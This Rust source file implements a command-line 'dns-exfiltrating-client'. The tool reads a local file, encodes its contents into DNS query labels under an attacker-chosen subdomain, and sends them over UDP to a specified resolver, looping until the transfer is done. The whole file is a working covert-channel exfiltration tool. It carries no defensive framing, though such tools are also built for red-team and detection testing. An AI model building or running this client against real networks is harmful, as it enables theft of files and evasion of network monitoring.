use std::fs;
use std::io;
use std::net::{UdpSocket, SocketAddrV4};

use structopt::StructOpt;
use trust_dns_proto::rr::domain::Label;
use trust_dns_proto::rr::Name;
use trust_dns_proto::serialize::binary::{BinDecodable, BinDecoder, BinEncodable, BinEncoder};

use dns_encoding::client::TransmissionState;
use dns_encoding::encode::MessageEncoder;
use dns_encoding::message::{Message, MessageResponse};

use log::{debug, info};
use std::str::FromStr;

#[derive(Debug, StructOpt)]
#[structopt(name = "dns-exfiltrating-client", about = "An client to exfiltrate files via dns.")]
struct ClientOptions {
    file_name: String,

    #[structopt(short, long)]
    dns_resolver: String,

    #[structopt(short, long)]
    sub_domain: String,

    #[structopt(short, long)]
    host: String,

    #[structopt(long, default_value = "20")]
    slice_size: usize,

    #[structopt(short, long, default_value = "8k1")]
    magic_nr: String,
}

struct Encoder {
    message_encoder: MessageEncoder,
    buffer: Vec<u8>,
}

impl Encoder {
    fn new(message_encoder: MessageEncoder) -> Encoder {
        let buffer = Vec::new();
        Encoder { message_encoder, buffer }
    }

    fn encode(&mut self, message: Message) {
        let dns_message = self.message_encoder.encode(message);
        debug!("Sending dns message {:?}", dns_message);
        let mut binary_encoder = BinEncoder::new(&mut self.buffer);
        dns_message.emit(&mut binary_encoder).unwrap();
    }

    fn as_slice(&self) -> &[u8] {
        self.buffer.as_slice()
    }

    fn clear(&mut self) {
        self.buffer.clear();
    }
}

struct Decoder {
    buffer: Vec<u8>,
}

impl Decoder {
    fn new() -> Decoder {
        let buffer = vec![0 as u8; 1024];
        Decoder { buffer }
    }

    fn decode(&mut self) -> MessageResponse {
        let mut binary_decoder = BinDecoder::new(&self.buffer);
        let server_message = trust_dns_proto::op::Message::read(&mut binary_decoder).unwrap();
        debug!("response dns message = {:?}", server_message);
        let server_message = MessageResponse::decode(&server_message).unwrap();
        server_message
    }

    fn as_slice(&mut self) -> &mut [u8] {
        self.buffer.as_mut_slice()
    }
}

fn main() -> io::Result<()> {
    env_logger::init();

    let opt: ClientOptions = ClientOptions::from_args();
    info!("options = {:?}", opt);
    let dns_resolver = SocketAddrV4::from_str(opt.dns_resolver.as_str()).unwrap();

    let contents = fs::read_to_string(&opt.file_name)?;
    let mut client_state = TransmissionState::new(opt.host,
                                                  opt.file_name.clone(),
                                                  contents.into_bytes(),
                                                  opt.slice_size);
    let magic_nr = Label::from_ascii(opt.magic_nr.as_str()).unwrap();
    let subdomain = Name::from_ascii(opt.sub_domain.as_str()).unwrap();

    let mut encoder = Encoder::new(MessageEncoder::new(magic_nr, subdomain));
    let mut decoder = Decoder::new();

    let first_message = client_state.initial_message();

    let socket = UdpSocket::bind("0.0.0.0:12345")?;
    socket.connect(dns_resolver).expect("Failed to connect to dns-resolver");

    debug!("Initial message = ${:?}", first_message);
    encoder.encode(first_message);
    debug!("Sending inital message to {:?}", dns_resolver);
    socket.send(encoder.as_slice()).expect("Failed to send first message");
    encoder.clear();

    loop {
        debug!("Waiting for first response");
        let (_bytes_read, address) = socket.recv_from(&mut decoder.as_slice())?;
        let server_message = decoder.decode();
        debug!("received message from {:?}: {:?}", address, server_message);
        let response = client_state.handle_response(server_message);
        match response {
            None => break,
            Some(response) => {
                debug!("response = {:?}", response);
                encoder.encode(response);
                socket.send_to(&encoder.as_slice(), dns_resolver)?;
                encoder.clear();
            }
        }
    }
    info!("Finished transmission of {}", &opt.file_name);
    Ok(())
}
